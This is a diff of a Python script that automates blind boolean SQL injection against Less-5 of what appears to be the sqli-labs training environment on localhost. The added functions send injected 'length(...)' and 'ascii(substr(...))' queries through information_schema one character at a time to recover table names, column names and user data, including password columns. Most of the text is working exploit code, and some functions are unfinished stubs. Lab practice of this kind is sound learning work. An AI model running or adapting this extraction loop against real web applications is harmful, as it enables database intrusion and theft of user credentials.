@@ -7,10 +7,37 @@ import time
 
 # Author: HackHuang
 # Description: For Less-5
-# Last Modified: 2024/12/03 23:15
+# Last Modified: 2024/12/07
 
 LAB_ROOT_URL: Final = 'http://localhost:8001'
-SQL_COMMENT: Final  = '--+'
+SQL_COMMENT: Final = '--+'
+
+# 'a' (97), 'b' (98), 'c' (99), 'd' (100), 'e' (101), 'f' (102), 'g' (103), 'h' (104), 'i' (105), 'j' (106),
+# 'k' (107), 'l' (108), 'm' (109), 'n' (110), 'o' (111), 'p' (112), 'q' (113), 'r' (114), 's' (115), 't' (116), 
+# 'u' (117), 'v' (118), 'w' (119), 'x' (120), 'y' (121), 'z' (122)
+LOWERCASE_CHAR_LIST: Final[Tuple[str, ...]] = ('a','b','c','d','e','f','g','h','i','j','k','l','m','n',
+                                  'o','p','q','r','s','t','u','v','w','x','y','z')
+# 'A' (65), 'B' (66), 'C' (67), 'D' (68), 'E' (69), 'F' (70), 'G' (71), 'H' (72), 'I' (73), 'J' (74), 
+# 'K' (75), 'L' (76), 'M' (77), 'N' (78), 'O' (79), 'P' (80), 'Q' (81), 'R' (82), 'S' (83), 'T' (84), 
+# 'U' (85), 'V' (86), 'W' (87), 'X' (88), 'Y' (89), 'Z' (90)
+UPPERCASE_CHAR_LIST: Final[Tuple[str, ...]] = ('A','B','C','D','E','F','G','H','I','J','K','L','M','N',
+                                  'O','P','Q','R','S','T','U','V','W','X','Y','Z')
+# '0' (48), '1' (49), '2' (50), '3' (51), '4' (52), '5' (53), '6' (54), '7' (55), '8' (56), '9' (57)
+NUMBER_CHAR_LIST: Final[Tuple[str, ...]] = ('0','1','2','3','4','5','6','7','8','9')
+# ' ' (32), '"' (34), '#' (35), '$' (36), '%' (37), '&' (38), '\'' (39),
+# '(' (40), ')' (41), '*' (42), ',' (44), '.' (46), '/' (47), ';' (59),
+# '<' (60), '=' (61), '>' (62), '@' (64), '[' (91), '\\' (92), ']' (93),
+# '_' (95), '`' (96), '{' (123), '|' (124), '}' (125), '©' (169),
+# '—' (8212), '€' (8364)
+# Note that "\\" will output: "\"
+OTHERS_CHAR_LIST: Final[Tuple[str, ...]] = (' ', ',', '"', '#', '$', '%', '&', "'", '(', ')', '*', ',', '.', 
+                               '/', ';', '<', '=', '>', '@', '[', "\\", ']', '_', '`', '{', '|', '}', '©', '€', '—')
+
+# all_char_sorted_list: All char lists included, such as four lists as above
+all_char_list: List[str] = list((*LOWERCASE_CHAR_LIST, *UPPERCASE_CHAR_LIST, *NUMBER_CHAR_LIST, *OTHERS_CHAR_LIST))
+all_char_ascii_list: List[int] = [ord(char) for char in all_char_list]
+all_char_ascii_sorted_list: List[int] = sorted(all_char_ascii_list)
+all_char_sorted_list: List[str] = [chr(char_ascii) for char_ascii in all_char_ascii_sorted_list]
 
 def url_decoder(url: str) -> str:
     decoded_url: str = unquote(url)
@@ -19,6 +46,14 @@ def url_decoder(url: str) -> str:
 def get_method(url: str, pattern: str) -> bool:
     reponse = requests.get(url=url)
     return True if re.search(pattern=pattern, string=reponse.text) else False
+
+@DeprecationWarning
+def init_char_list_by_ascii() -> None:
+    global all_char_sorted_list
+    all_char_list = list((*LOWERCASE_CHAR_LIST, *UPPERCASE_CHAR_LIST, *NUMBER_CHAR_LIST, *OTHERS_CHAR_LIST))
+    all_char_ascii_list = [ord(char) for char in all_char_list]
+    all_char_ascii_sorted_list = sorted(all_char_ascii_list)
+    all_char_sorted_list = [chr(char_ascii) for char_ascii in all_char_ascii_sorted_list]
 
 def binary_search() -> None:
     pass
@@ -112,46 +147,78 @@ def get_column_num(table_name_list: List, pattern: str) -> Dict[str, int]:
     return column_num_dict
 
 # TODO
-def get_column_name_len(column_num_dict: Dict[str, int], pattern: str) -> Dict[str, Dict[int, List[int]]]:
+def get_able_and_column_info(column_num_dict: Dict[str, int], pattern: str) -> Dict[str, Dict[int, List[int]]]:
+    # eg.{'users': {3: [2, 8, 8]}}
+    # users: table name
+    # 3: column number
+    # [2, 8, 8]: every column len
     column_name_len_dict: Dict[str, Dict[int, List[int]]] = {}
     for table_name, table_colmun_num in column_num_dict.items():
-        temp_column_name_len: int = 0
+        temp_column_name_len: int = 1
         temp_limit_begin_index: int = 0
-        temp_column_name_list: List[int] = []
-        while len(temp_column_name_list) < table_colmun_num:
-            url: str = f"/Less-5/?id=1' and length((select column_name from information_schema.columns where table_name = 'users' limit {limit_begin_index}, 1)) = 2"
+        temp_column_name_len_list: List[int] = []
+        while len(temp_column_name_len_list) < table_colmun_num:
+            url: str = f"/Less-5/?id=1' and length((select column_name from information_schema.columns where table_name = '{table_name}' limit {temp_limit_begin_index}, 1)) = {temp_column_name_len}"
             url = LAB_ROOT_URL + url + SQL_COMMENT
             print(f'Try to get the column name len: {url}')
             if get_method(url=url, pattern=pattern):
-                temp_column_name_list.append(temp_column_name_len)
+                temp_column_name_len_list.append(temp_column_name_len)
+                temp_column_name_len = 0
                 temp_limit_begin_index = temp_limit_begin_index + 1
             temp_column_name_len = temp_column_name_len + 1
-        column_name_len_dict[table_name] = {table_colmun_num: temp_column_name_list}
+        column_name_len_dict[table_name] = {table_colmun_num: temp_column_name_len_list}
         print(f'The column name len had been got: {column_name_len_dict}')
     return column_name_len_dict
 
+def get_column_name(pattern: str, table_and_column_info_dict: Dict[str, Dict[int, List[int]]]) -> Dict[str, List[str]]:
+    table_and_column_dict: Dict[str, List[str]] = {}
+    for table_name, column_info_dict in table_and_column_info_dict.items():
+        temp_column_name_list: List = []
+        for column_num, column_name_len_list in column_info_dict.items():
+            temp_limit_begin_index: int = 0
+            while len(temp_column_name_list) < column_num:
+                for column_name_len in column_name_len_list:
+                    temp_column_name: str = ''
+                    temp_char_index: int = 0
+                    temp_substr_begin_index: int = 1
+                    while len(temp_column_name) < column_name_len:
+                        temp_char: str = all_char_sorted_list[temp_char_index]
+                        url: str = f"/Less-5/?id=1' and ascii(substr((select column_name from information_schema.columns where table_name='{table_name}' limit {temp_limit_begin_index}, 1), {temp_substr_begin_index}, 1))='{ord(temp_char)}'"
+                        url = LAB_ROOT_URL + url + SQL_COMMENT
+                        print(f'Try to the column name: {url}')
+                        if get_method(url=url, pattern=pattern):
+                            temp_column_name = temp_column_name + temp_char
+                            temp_substr_begin_index = temp_substr_begin_index + 1
+                            temp_char_index = 0
+                        temp_char_index = temp_char_index + 1
+                    temp_column_name_list.append(temp_column_name)
+                    print(f'The column name had been got: {temp_column_name_list}, table name: {table_name}')
+                    temp_limit_begin_index = temp_limit_begin_index + 1
+        table_and_column_dict[table_name] = temp_column_name_list
+    return table_and_column_dict
+
 # TODO
-def get_column_name(pattern: str, column_name_len_list: List[int], table_name_list: List[str]) -> List:
-    column_name_list: List = []
-    limit_begin_index: int = 0
-    for column_name_len in column_name_len_list:
-        column_name: str = ''
-        column_name_char_ascii: int = 97
-        sub_begin_index: int = 1
-        while len(column_name) < column_name_len:
-            url: str = "/Less-5/?id=1' and substr((select column_name from information_schema.columns where table_name='users' limit 0, 1), 1, 1)='i'"
-            url = LAB_ROOT_URL + url + SQL_COMMENT
+def get_data_num(table_name_list: List[str], pattern: str) -> Dict[str, int]:
+    data_num_dict: Dict[str, int] = {}
+    for table_name in table_name_list:
+        data_num: int = 0
+        while True:
+            url_str: str = f"/Less-5/?id=1' and length((select group_concat(id) from emails)) - length((select replace(group_concat(id), ',', '') from emails))=7"
+            url_str = SQL_COMMENT + url_str + SQL_COMMENT
+            print(f'Try to get the data num: {url_str}')
             pass
-    return []
+    return {}
 
 def get_data_len() -> None:
+    url_str: str = f"http://localhost:8001/Less-5/?id=1' and length((select email_id from emails limit 0,1)) = 16--+"
     pass
 
 def get_data() -> None:
+    url_str: str = f"http://localhost:8001/Less-5/?id=1' and ascii(substr((select email_id from emails limit 0,1), 1,1))='68'--+"
     pass
 
-# Decoded URL: http://127.0.0.1/sqllib/Less-5/?id=1'and left(database(),1)>'a'--+
-# print(f"Decoded URL: {url_decoder("http://127.0.0.1/sqllib/Less-5/?id=1%27and%20left(database(),1)%3E%27a%27--+")}")
+# Decoded URL: ?id=1' and ORD(MID((SELECT IFNULL(CAST(username AS CHAR),0x20) FROM security.users ORDER BY id LIMIT 0,1),1,1))=68--+
+# print(f"Decoded URL: {url_decoder("?id=1%27%20and%20ORD(MID((SELECT%20IFNULL(CAST(username%20AS%20CHAR),0x20)FROM%20security.users%20ORDER%20BY%20id%20LIMIT%200,1),1,1))=68--+")}")
 
 # db_name_len: int = get_db_name_len(url="/Less-5/?id=1'and length(database())=")
 # print(f'The db name length: {db_name_len}')
@@ -168,6 +235,13 @@ def get_data() -> None:
 get_table_num_url: str = "/Less-5/?id=1' AND ((SELECT LENGTH(GROUP_CONCAT(table_name)) - LENGTH(REPLACE(GROUP_CONCAT(table_name), ',', '')) FROM information_schema.tables WHERE table_schema = DATABASE()) = "
 table_name_list: List = get_table_name(pattern='You are in', table_name_len_list=get_table_name_len(table_num=get_table_num(url=get_table_num_url)))
 print(f'The table name list: {table_name_list}\n\n')
-
-column_num_dict = get_column_num(table_name_list=table_name_list, pattern='You are in')
-print(f'The column num dict: {column_num_dict}')
+column_num_dict: Dict[str, int] = get_column_num(table_name_list=table_name_list, pattern='You are in')
+print(f'The column num dict: {column_num_dict}\n\n')
+table_and_column_info_dict: Dict[str, Dict[int, List[int]]] = get_able_and_column_info(column_num_dict=column_num_dict, pattern='You are in')
+print(f'The column name len dict: {table_and_column_info_dict}\n\n')
+table_and_column_name_dict: Dict[str, List[str]] = get_column_name(pattern='You are in', table_and_column_info_dict=table_and_column_info_dict)
+# {'emails': ['id', 'email_id'], 
+# 'referers': ['id', 'referer', 'ip_address'], 
+# 'uagents': ['id', 'uagent', 'ip_address', 'username'], 
+# 'users': ['id', 'username', 'password']}
+print(f'The table name and column name dict: {table_and_column_name_dict}')
